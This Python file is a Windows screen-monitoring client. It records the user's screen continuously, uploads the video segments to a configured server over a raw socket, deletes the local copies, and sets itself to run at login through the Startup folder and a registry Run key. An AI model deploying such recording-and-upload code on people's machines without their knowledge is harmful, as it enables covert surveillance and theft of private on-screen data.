import datetime  
import socket
import os
import struct
import sys
import cv2
import numpy as np  #pip install numpy
import cv2 as cv    #pip install opencv-python
import pyautogui    #pip install PyAutoGUI
import time
from os import walk
import shutil
import winreg
from pywinauto import Application
from dotenv import dotenv_values
from threading import Thread
import psutil
import win32event
import win32api
import tkinter as tk
from tkinter import messagebox

mutex_name = "Monitoring_client"

mutex = win32event.CreateMutex(None, 1, mutex_name)
if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
    log_file = open("Monitoring_client.log", mode='a', buffering=1)
    log_file.write("Another instance of the program is already running. {}\n".format(time.strftime("%y:%m:%d %H:%M:%S", time.localtime())))
    log_file.close()   
    sys.exit()
# win32event.ReleaseMutex(mutex)
def check_socket_connection():
    global server_port
    server_port = 56230
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(20)
        sock.connect((server_ip, server_port))
        # If the connection was successful, print a success message
        print(f"Successfully connected to {server_ip}")
        messagebox.showinfo("Server connection success.", f"Successfully connected to {server_ip}")
        sock.close()
        return True
    except socket.error as e:
        # If an error occurred during the connection attempt, print the error message
        print(f"Failed to connect to {server_ip}:{server_port} - {e}")
        messagebox.showwarning("Connection faild", f"Please insert correct SERVER_ID and USER_NAME in setting.conf. \n \nFailed to connect to {server_ip} - {e}")
        return False
def find_time():
    x = datetime.datetime.now()
    date_for_name = (x.strftime("%d") + "-" + x.strftime("%m") + "-" + x.strftime("%Y") + "-" + x.strftime("%H") + "-" +
                     x.strftime("%M") + "-" + x.strftime("%S"))
    return date_for_name

def send(screen, currtime, idletime, filename, username):
    sock = socket.socket()
    sock.settimeout(60)
    try:
        print('server send success...')
        sock.connect((server_ip, server_port))
        sock.sendall(struct.pack('<QQ64s64sI', 111, 222, filename.encode('utf-8'), username.encode('utf-8'), len(screen)))
        sock.sendall(screen)
        sock.close()
        os.remove( directory+filename )
        log_file = open("Monitoring_client.log", mode='a', buffering=1)
        log_file.write("send file success....\n")
        log_file.close()
        
    except:
        print('server connection faild.')
        # send(screen, currtime, idletime, filename, username)
        log_file = open("Monitoring_client.log", mode='a', buffering=1)
        log_file.write("Server connection failed.\n")
        log_file.close()
 
def video_record():
    log_file = open("Monitoring_client.log", mode='a', buffering=1)
    log_file.write("Started recording...\n")
    log_file.close()
    cut_time = 10
    create_time = datetime.datetime.now()
    screen_width, screen_height = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    output = cv2.VideoWriter(directory + user_name + " " + find_time() + ".avi", fourcc, 20.0, (screen_width, screen_height))
    frame_count = 0
    while True:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        output.write(frame)
        frame_count += 1
        if frame_count % (20 * 60 * cut_time) == 0:
            output.release()
            thread = Thread(target=into_server, args=(cut_time,))
            thread.start()
            # into_server(cut_time)
            output = cv2.VideoWriter(directory + user_name + " " + find_time() + ".avi", fourcc, 20.0, (screen_width, screen_height))
        # current_time = datetime.datetime.now()
        # difference_minutes = (current_time - create_time).total_seconds() / 60
        # if difference_minutes >= 2.1:
        #     break
    output.release()
    cv2.destroyAllWindows()

def add_to_startup():
    running_file = sys.argv[0]
    script_path = os.path.abspath(running_file)
    setting_path = os.path.abspath('setting.conf')
    script_name = "Monitoring"
    
    # Get the path to the Startup folder
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # Copy the script to the Startup folder
    if not os.path.exists(os.path.join(startup_folder, "main.exe")):
        # Copy the script to the Startup folder
        shutil.copy2(script_path, startup_folder)
    else:
        pass
    if not os.path.exists(os.path.join(startup_folder, "setting.conf")):
        # Copy the setting file to the Startup folder
        shutil.copy2(setting_path, startup_folder)
    else:
        pass
    # Create a shortcut to the script
    shortcut_path = os.path.join(startup_folder, f"{script_name}.lnk")
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
        winreg.SetValueEx(key, script_name, 0, winreg.REG_SZ, shortcut_path)
        
def add_login_startup(file_path):
    # Open the registry key for the current user's startup folder
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)

    # Set the path to your Python executable file
    exe_path = os.path.abspath(file_path)

    # Add the executable to the startup folder
    winreg.SetValueEx(key, "MyProgram", 0, winreg.REG_SZ, exe_path)

    # Close the registry key
    winreg.CloseKey(key)

def current_recording(cut_time,created_file_time):
    _current_time = datetime.datetime.now()
    change_time_dt = datetime.datetime.strptime(created_file_time, "%d-%m-%Y-%H-%M-%S")
    diff = (_current_time - change_time_dt).total_seconds() / 60
    if diff < cut_time:
        return False
    return True
def into_server(cut_time):
    files = os.listdir(directory)
    for file in files:
        created_file_time = file.split(' ')[1].split('.')[0]
        if current_recording(cut_time,created_file_time):
            imgfp = open(directory+file, 'rb')
            imgdata = imgfp.read()
            imgfp.close()
            send(imgdata, find_time(), find_time(), file, user_name)
def create_result_directory():
    global directory
    directory = "C:\\Users/Public/Result_Output/"
    if os.path.exists(directory):
        pass
    else:
        os.makedirs(directory)

def start_monitoring():
    log_file = open("Monitoring_client.log", mode='a', buffering=1)
    log_file.write("Started monitoring client."+ ' {}\n'.format(time.strftime("%y:%m:%d %H:%M:%S", time.localtime())))
    log_file.close()
    add_to_startup()
    create_result_directory()
    video_record()

# def start_process():
status = True
while status:
    global server_ip,user_name
    with open('setting.conf', 'r') as file:
        for line in file:
            if line.startswith('SERVER_IP'):
                server_ip = line.split('=')[1].strip()
            elif line.startswith('USER_NAME'):
                user_name = line.split('=')[1].strip()
    if user_name == '':
        status = True
        messagebox.showwarning("Incorrect USER_NAME", f"Please insert correct USER_NAME in setting.conf.")
        # log_file = open("Monitoring_client.log", mode='a', buffering=1)
        # log_file.write('Please input SERVER_IP,USER_NAME...' + ' {}\n'.format(time.strftime("%y:%m:%d %H:%M:%S", time.localtime())))
        # log_file.close()
    elif check_socket_connection() == False:
        status = True
    else :
        try:
            start_monitoring()
            status = False
        except Exception as e:
            log_file = open("Monitoring_client.log", mode='a', buffering=1)
            log_file.write(str(e) + ' {}\n'.format(time.strftime("%y:%m:%d %H:%M:%S", time.localtime())))
            log_file.close()
            status = True
            # win32event.ReleaseMutex(mutex)
    print(f"SERVER_IP: {server_ip}")
    print(f"USER_NAME: {user_name}")